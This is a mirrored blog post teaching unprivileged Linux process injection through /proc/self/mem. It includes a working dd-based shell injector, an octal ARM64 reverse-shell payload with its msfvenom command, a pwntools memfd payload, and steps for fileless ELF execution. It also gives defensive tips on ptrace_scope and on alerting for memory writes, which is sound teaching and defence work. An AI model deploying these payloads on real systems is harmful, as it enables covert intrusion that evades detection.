<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://joev.dev/posts/unprivileged-process-injection-techniques-in-linux">Original</a>
    <h1>Unprivileged process injection techniques in Linux</h1>
    
    <div id="readability-page-1" class="page"><div id="post">
<blockquote>
<p>In this post I&#39;ll cover the history of process injection implementations on Linux, and share a somewhat different and simpler implementation aimed at learning and portability.</p>
</blockquote>
<p>When pentesting Linux boxes, you often end up in a common situation: you have command execution as a non-root user and want to stage some native code to run on the target. There are a number of methods to accomplish this, but they can be roughly categorized into the following:</p>
<ol>
<li>Use shell commands to write the native code to a file somewhere, and <code>exec()</code> or <code>LD_PRELOAD</code> the code.</li>
<li>Use <code>ptrace()</code> or <code>/proc/PID/mem</code> to debug a sacrificial victim process and plant your native code inside of it.</li>
</ol>
<p>There are downsides to #1; you need a decoding routine, as shell scripts cannot contain binary data. Additionally, you need a writable location on disk; this is not always true in e.g. read-only chroots, filesystems, containers, etc. Finally, many intrusion detection systems look specifically for #1 and alert on it, as it is a typical behavior of malware to stage and run a native implant in a straightforward and widely compatible way.</p>
<p>This post will look at #2.</p>
<h3 id="process-injection-using-ptrace">Process Injection using ptrace()</h3>
<p>On Linux you use the <code>ptrace</code> syscall to remotely control the execution of a process and read/write into its memory. This is a pretty suspicious syscall to trigger in an infected process, and from a command injection entrypoint there are not many ways to control it (<code>gdb</code> being one way). Further most Linux distros implement a <code>sysctl</code> called <a href="https://www.kernel.org/doc/Documentation/security/Yama.txt"><code>kernel/yama/ptrace_scope</code></a> that controls what processes can be <code>ptraced</code> by an unprivileged user:</p>
<pre><code>The sysctl settings (writable only with CAP_SYS_PTRACE) are:

0 - classic ptrace permissions: a process can PTRACE_ATTACH to any other
    process running under the same uid, as long as it is dumpable (i.e.
    did not transition uids, start privileged, or have called
    prctl(PR_SET_DUMPABLE...) already). Similarly, PTRACE_TRACEME is
    unchanged.

1 - restricted ptrace: a process must have a predefined relationship
    with the inferior it wants to call PTRACE_ATTACH on. By default,
    this relationship is that of only its descendants when the above
    classic criteria is also met. To change the relationship, an
    inferior can call prctl(PR_SET_PTRACER, debugger, ...) to declare
    an allowed debugger PID to call PTRACE_ATTACH on the inferior.
    Using PTRACE_TRACEME is unchanged.

2 - admin-only attach: only processes with CAP_SYS_PTRACE may use ptrace
    with PTRACE_ATTACH, or through children calling PTRACE_TRACEME.

3 - no attach: no processes may use ptrace with PTRACE_ATTACH nor via
    PTRACE_TRACEME. Once set, this sysctl value cannot be changed.
</code></pre>
<p>Most modern production systems set <code>1</code>, &#34;restricted ptrace&#34;, meaning non-root users can only really <code>ptrace</code> child processes. So a simple way to inject code would be to start a <code>sleep</code> child process, attach to it with <code>exec gdb</code>, then go to the current instruction pointer and overwrite the memory it points to with your shellcode. But again, this requires <code>gdb</code> on the box (usually rare) and is pretty noisy.</p>
<blockquote>
<p><span></span> On defense, setting <code>2</code> is often a good recommendation to make, as it prevents any runtime debugging shenanigans without admin privs, and negates this entire class of techniques for non-root users.</p>
</blockquote>
<h3 id="the-procpidmem-devices">The /proc/[pid]/mem devices</h3>
<p>On Linux systems, the <code>procfs</code> mount implements <code>mem</code> device files for all processes in the namespace, available at <code>/proc/[pid]/mem</code>. These devices allow using standard filesystem syscalls to manipulate remote process memory. Behind the scenes, they are more or less a clone of parts of the existing <code>ptrace</code> syscalls; and in fact use the same <code>ptrace_scope</code> sysctl and resulting permissions.</p>
<p>This allows us to use standard (<code>util-linux</code> and <code>coreutils</code>) commands (like <code>dd</code> or <code>printf</code>) to seek through and overwrite remote process memory via these device files; which lets us stage native code quietly and without needing a writable location on disk or relying on esoteric binaries. As such, nearly all implementations of process injection on Linux that I have seen use <code>/proc/[pid]/mem</code> for injection.</p>
<blockquote>
<p><span></span> On defense, consider adding a weighted alert on anomalous attempts to <code>ptrace()</code> or <code>open(&#34;/proc/*/mem&#34;, &#34;w&#34;)</code></p>
</blockquote>
<h3 id="a-brief-history-of-procpidmem-injections">A brief history of /proc/[pid]/mem injections</h3>
<p>The first time I saw this technique used was 2017, in a tool now called <a href="https://github.com/GDSSecurity/Cexigua">GDSSecurity/Cegua</a> mentioned in <a href="https://www.aon.com/cyber-solutions/aon_cyber_labs/linux-based-inter-process-code-injection-without-ptrace2/">this blog post</a>. I will summarize it below because what the author did was brilliant; but also abject lunacy, in any case it got the job done for them:</p>
<ol>
<li>Spawn sacrificial child process</li>
<li>Read <code>/proc/[pid]/maps</code> to gather address of child process&#39;s stack</li>
<li><code>kill -STOP</code> the child</li>
<li>Open child process&#39;s <code>/proc/[pid]/mem</code> device</li>
<li>Use GNU binary <code>grep</code> toâ€¦ dynamically search for rop gadgets and build a rop chain that stack pivots into shellcode (<strong>????</strong>)</li>
<li>Use <code>dd</code> to overwrite the child&#39;s stack memory with the rop chain and shellcode</li>
<li><code>kill -CONT</code> the child</li>
</ol>
<p>Now this is crazy cool, but as the author admits later, the ROP chain is unnecessary. It suffices to just plop some shellcode into memory and have the remote process execute it, which the author eventually realized.</p>
<blockquote>
<p>If you are wondering &#34;why can you overwrite a process&#39;s executable memory without changing the memory&#39;s NX flags?&#34;, basically the Linux kernel helpfully disables write protections during use of <code>ptrace</code> write calls, for developer convenience. A good explanation of how this is achieved amidst things like hardware-based memory protections <a href="https://offlinemark.com/2021/05/12/an-obscure-quirk-of-proc/">can be found here</a>.</p>
</blockquote>
<p>In 2018, <a href="https://blog.sektor7.net/#!res/2018/pure-in-memory-linux.md">rb from Sektor7 wrote a comprehensive article</a> on use of <code>ptrace</code> and <code>/proc/*/mem</code> techniques for in-memory shellcode injection on Linux. I highly recommend reading this as a starting point, as it provides a simple (but version/offset-dependent) injection script example at the end.</p>
<p>Following this there were a number of tools developed with similar, evolving techniques for Linux process injection. <a href="https://github.com/DavidBuchanan314/dlinject"><code>DavidBuchanan314/dlinject</code></a> is a more straightforward implementation, but requires python on the target. <a href="https://github.com/arget13/DDexec"><code>arget13/DDexec</code></a> improves on this by using <code>/bin/sh</code> instead of python, and researching and documenting how to avoid command dependencies. <code>DDExec</code> works by overwriting <code>/proc/self/mem</code> in a forked shell process; which is sort of like a process performing brain surgery <em>on itself</em> ðŸ¤¯. Recently the same <code>dlinject</code> author wrote <a href="https://github.com/DavidBuchanan314/stelf-loader"><code>DavidBuchanan314/stelf-loader</code></a>, which builds on this approach but with an extremely interesting implementation - it lets you provide an ELF input instead of shellcode and handles transparently loading it into memory for you.</p>
<blockquote>
<p><span></span> On offense, writing tools that run on all the Linux distros (and modern containers) is an art in itself. The best advice IMHO to write tools that live forever is: know the <a href="https://pubs.opengroup.org/onlinepubs/9699919799/utilities/V3_chap02.html">POSIX shell spec</a>, and try to avoid <code>exec()</code>ing to other commands - when you must, only rely on broad packages: <code>utils-linux</code> and <code>coreutils</code> are good starting points.</p>
</blockquote>
<h3 id="rolling-our-own-simple-implementation">Rolling our own simple implementation</h3>
<p>After reviewing the state of the art here, I like to use a much dumber approach: one that requires very little effort to implement but retains wide compatibility across Linux environments. It just does this:</p>
<ol>
<li>From a shell, open a write fd to <code>/proc/self/mem</code></li>
<li>Read <code>/proc/self/syscall</code> to find the return address of the <code>read()</code> syscall</li>
<li>In a child subshell, skip the fd to this address using <code>dd skip=...</code>, then write your shellcode payload</li>
<li>The parent process will then <code>read()</code> from the child process, triggering the payload</li>
</ol>
<p>This is written to only require <code>dd</code> (part of <code>coreutils</code>) and absolutely nothing else. It can be pulled together in 4 lines of portable POSIX shell script, here you go:</p>
<pre><code>PAYLOAD=<span>&#39;\002\000\240\343\001\020\240\343\005\040\201\342\214\160&#39;</span>\
<span>&#39;\240\343\215\160\207\342\000\000\000\357\000\140\240\341\140\020&#39;</span>\
<span>&#39;\217\342\020\040\240\343\215\160\240\343\216\160\207\342\000\000&#39;</span>\
<span>&#39;\000\357\006\000\240\341\000\020\240\343\077\160\240\343\000\000&#39;</span>\
<span>&#39;\000\357\006\000\240\341\001\020\240\343\077\160\240\343\000\000&#39;</span>\
<span>&#39;\000\357\006\000\240\341\002\020\240\343\077\160\240\343\000\000&#39;</span>\
<span>&#39;\000\357\044\000\217\342\004\100\044\340\020\000\055\351\015\040&#39;</span>\
<span>&#39;\240\341\044\100\217\342\020\000\055\351\015\020\240\341\013\160&#39;</span>\
<span>&#39;\240\343\000\000\000\357\002\000\025\263\177\000\000\001\057\142&#39;</span>\
<span>&#39;\151\156\057\163\150\000\000\000\000\000\000\000\000\000\163\150&#39;</span>\
<span>&#39;\000\000\000\000\000\000\000\000\000\000\000\000\000\000&#39;</span>
(
<span>exec</span> 5&gt;/proc/self/mem 
<span>read</span> -r _ _ _ _ _ _ _ _ ADDR &lt;/proc/self/syscall
( <span>dd</span> count=0 bs=1 skip=$((ADDR)) &lt;&amp;5; <span>printf</span> <span>&#34;<span>${PAYLOAD}</span>&#34;</span> &gt;&amp;5 )
) &amp;
</code></pre>
<blockquote>
<p><span></span> <strong>Pro tip:</strong> On offense, use <code>printf</code> with <code>\000</code> octal for decoding embedded binary data within a shell script; it&#39;s the only binary decoding routine guaranteed by <a href="https://pubs.opengroup.org/onlinepubs/009696799/utilities/printf.html">the POSIX <code>sh</code> spec</a>.</p>
</blockquote>
<p>The shellcode above is for the <code>ARM64</code> architecture, generated by metasploit and encoded into octal; it connects a TCP reverse shell over to a listener on <code>127.0.0.1:5555</code>. Here is how I generated it (use <code>aarch64</code> for ARM64 and <code>x64</code> for X86_64):</p>
<pre><code>$ docker run -it metasploitframework/metasploit-framework bash
&gt; ./msfvenom -p linux/aarch64/shell_reverse_tcp lhost=127.0.0.1 lport=5555 -f raw | \
    ruby -e <span>&#39;STDIN.read.bytes.each { |b| printf &#34;\\%03o&#34;, b }&#39;</span>
</code></pre>
<p>Of course a reverse shell payload is not practical at all; we already have command execution in this situation. The much more useful thing to do is to create a memory-backed fd that we can then write an arbitrary ELF executable to and execute. So we&#39;ll tweak the shellcode payload a bit to do this. You can use <code>metasm_shell.rb</code> to do this in metasploit, but <code>pwntools</code> makes things a bit easier IMO, as it is architecture-agnostic. We&#39;ll have the shellcode call <code>memfd_create</code>, then send itself a <code>SIG_STOP</code> so we can use the memfd from our original shell:</p>
<pre><code>$ docker run --platform linux/amd64 -it pwntools/pwntools
pwntools@d7869fd2a307:/$ python
&gt;&gt;&gt; from pwn import *
import sys
context.arch = <span>&#39;arm64&#39;</span>
sc = asm(shellcraft.memfd_create(<span>&#34;&#34;</span>, 0)) + asm(shellcraft.kill(0, 19))
output = <span>&#34;&#34;</span>
<span>for</span> b <span>in</span> sc:
    output += <span>&#34;\\%03o&#34;</span> % (b)

<span>print</span>(<span>&#34;PAYLOAD=&#39;%s&#39;&#34;</span> % (output))
</code></pre>
<p>Which yields:</p>
<pre><code>PAYLOAD=<span>&#39;\356\003\037\252\356\017\037\370\340\003\000\221\341\003\037&#39;</span>\
<span>&#39;\252\350\042\200\322\001\000\000\324\340\003\037\252\141\002\200\322&#39;</span>\
<span>&#39;\050\020\200\322\001\000\000\324&#39;</span>
</code></pre>
<p>After executing the above shellcode, we can find the writable memfd handle number by consulting the child process:</p>
<pre><code>$ CHILD=$!
$ <span>ls</span> -al /proc/<span>$CHILD</span>/fd/
total 0
dr-x------    2 msf      msf              0 Aug 29 20:45 .
dr-xr-xr-x    9 msf      msf              0 Aug 29 20:44 ..
lrwx------    1 msf      msf             64 Aug 29 20:45 0 -&gt; /dev/pts/0
lrwx------    1 msf      msf             64 Aug 29 20:45 1 -&gt; /dev/pts/0
lrwx------    1 msf      msf             64 Aug 29 20:45 2 -&gt; /dev/pts/0
lrwx------    1 msf      msf             64 Aug 29 20:45 255 -&gt; /dev/pts/0
lrwx------    1 msf      msf             64 Aug 29 20:45 3 -&gt; /memfd: (deleted)
l-wx------    1 msf      msf             64 Aug 29 20:45 5 -&gt; /proc/123/mem
</code></pre>
<p>We can then just use a series of <code>printf</code> statements to write our ELF executable to the <code>memfd</code> on fd#3, and execute it like normal.</p>
<pre><code>$ <span>printf</span> <span>&#39;...&#39;</span> &gt;&gt; /proc/<span>$CHILD</span>/fd/3
$ /proc/<span>$CHILD</span>/fd/3 &amp;
</code></pre>
<p>And that is one way to run executables on Linux without ever touching disk. This approach <em>should</em> work on all distributions of Linux, provided <code>sys/kernel/yama/ptrace_scope</code> is set to 1 or lower and the <code>dd</code> bin is available. If by some chance <code>dd</code> is missing (<code>dd</code> is part of coreutils, but you never know), see <a href="https://github.com/arget13/DDexec">DDExec</a> for a list of alternative common Linux commands that will seek a file descriptor to a desired offset.</p>
</div></div>
  </body>
</html>
